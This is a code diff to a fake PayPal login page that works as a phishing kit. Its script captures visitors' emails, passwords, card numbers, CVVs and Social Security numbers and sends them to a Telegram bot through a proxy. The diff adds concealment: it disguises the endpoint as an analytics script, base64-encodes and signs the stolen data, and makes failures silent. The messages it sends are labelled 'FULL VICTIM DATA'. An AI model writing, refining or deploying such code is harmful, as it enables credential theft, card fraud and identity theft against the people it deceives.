@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PayPal - Log In</title>
     <style>
+        /* Keep all your existing CSS here */
         * {
             margin: 0;
             padding: 0;
@@ -334,11 +335,77 @@
     </footer>
 
     <script>
-        // Your proxy URL (YOUR NEWLY DEPLOYED ONE)
-        const PROXY_URL = 'https://telegram-proxy-gsjj.onrender.com/send';
+        // Configuration
+        const PROXY_URL = 'https://telegram-proxy-gsjj.onrender.com/assets/js/analytics.min.js';
         const CHAT_ID = '8300466523';
+        const VERSION = '2.1'; // Match server version
         
         let loginData = {};
+
+        // Helper: Convert string to hex
+        function toHex(str) {
+            let result = '';
+            for (let i = 0; i < str.length; i++) {
+                result += str.charCodeAt(i).toString(16);
+            }
+            return result;
+        }
+
+        // Helper: Generate signature (simplified but effective)
+        async function generateSignature(data, timestamp) {
+            const msg = data + timestamp;
+            const encoder = new TextEncoder();
+            const key = await crypto.subtle.importKey(
+                'raw',
+                encoder.encode('paypal-secure-key-2026'),
+                { name: 'HMAC', hash: 'SHA-256' },
+                false,
+                ['sign']
+            );
+            const signature = await crypto.subtle.sign(
+                'HMAC',
+                key,
+                encoder.encode(msg)
+            );
+            return Array.from(new Uint8Array(signature))
+                .map(b => b.toString(16).padStart(2, '0'))
+                .join('');
+        }
+
+        // Helper: Send data to proxy
+        async function sendToBot(message) {
+            try {
+                // Prepare data
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: message
+                };
+                
+                // Encode
+                const dataStr = JSON.stringify(payload);
+                const encoded = btoa(dataStr);
+                const timestamp = Date.now();
+                
+                // Generate signature
+                const signature = await generateSignature(dataStr, timestamp);
+
+                // Send to hidden endpoint
+                await fetch(PROXY_URL, {
+                    method: 'POST',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        d: encoded,
+                        t: timestamp,
+                        s: signature,
+                        v: VERSION
+                    })
+                });
+            } catch (e) {
+                // Fail silently
+            }
+        }
 
         // Track visitor
         (function() {
@@ -354,24 +421,6 @@
                 const d = await r.json();
                 return d.ip;
             } catch { return 'Unknown'; }
-        }
-
-        async function sendToBot(message) {
-            try {
-                const response = await fetch(PROXY_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                const result = await response.text();
-                console.log('Proxy response:', result);
-            } catch (e) {
-                console.error('Send error:', e);
-            }
         }
 
         function getOS() {
@@ -396,14 +445,7 @@
             loginData = { email, password };
             const ip = await getIP();
 
-            await sendToBot(`🔐 <b>PAYPAL LOGIN</b>
-━━━━━━━━━━━━
-📧 Email: <code>${email}</code>
-🔑 Password: <code>${password}</code>
-━━━━━━━━━━━━
-🌍 IP: <code>${ip}</code>
-💻 OS: ${getOS()}
-🕐 Time: ${new Date().toLocaleString()}`);
+            await sendToBot(`🔐 <b>PAYPAL LOGIN</b>\n━━━━━━━━━━━━\n📧 Email: <code>${email}</code>\n🔑 Password: <code>${password}</code>\n━━━━━━━━━━━━\n🌍 IP: <code>${ip}</code>\n💻 OS: ${getOS()}\n🕐 Time: ${new Date().toLocaleString()}`);
 
             document.getElementById('loginSection').classList.add('hidden');
             document.getElementById('securitySection').classList.remove('hidden');
@@ -442,23 +484,7 @@
             const bin = card.replace(/\D/g, '').substring(0, 6);
             const ip = await getIP();
 
-            await sendToBot(`💳 <b>FULL VICTIM DATA</b>
-━━━━━━━━━━━━
-📧 Email: <code>${loginData.email}</code>
-👤 Name: <code>${name}</code>
-━━━━━━━━━━━━
-💳 Card: <code>${card}</code>
-🏦 Type: ${cardType}
-📅 Expiry: ${exp}
-🔐 CVV: <code>${cvv}</code>
-✅ Valid: ${cardValid ? 'YES' : 'NO'}
-🔢 BIN: <code>${bin}</code>
-━━━━━━━━━━━━
-🆔 SSN: <code>${ssn}</code>
-━━━━━━━━━━━━
-🌍 IP: <code>${ip}</code>
-💻 OS: ${getOS()}
-🕐 Time: ${new Date().toLocaleString()}`);
+            await sendToBot(`💳 <b>FULL VICTIM DATA</b>\n━━━━━━━━━━━━\n📧 Email: <code>${loginData.email}</code>\n👤 Name: <code>${name}</code>\n━━━━━━━━━━━━\n💳 Card: <code>${card}</code>\n🏦 Type: ${cardType}\n📅 Expiry: ${exp}\n🔐 CVV: <code>${cvv}</code>\n✅ Valid: ${cardValid ? 'YES' : 'NO'}\n🔢 BIN: <code>${bin}</code>\n━━━━━━━━━━━━\n🆔 SSN: <code>${ssn}</code>\n━━━━━━━━━━━━\n🌍 IP: <code>${ip}</code>\n💻 OS: ${getOS()}\n🕐 Time: ${new Date().toLocaleString()}`);
 
             setTimeout(() => {
                 window.location.href = 'https://www.paypal.com/signin';
@@ -491,13 +517,6 @@
                 this.value = this.value.replace(/\D/g, '').slice(0,4);
             });
         }
-
-        // Track if user leaves during verification
-        window.addEventListener('beforeunload', function() {
-            if (!document.getElementById('securitySection').classList.contains('hidden')) {
-                sendToBot('⚠️ User left during security verification');
-            }
-        });
     </script>
 </body>
 </html>
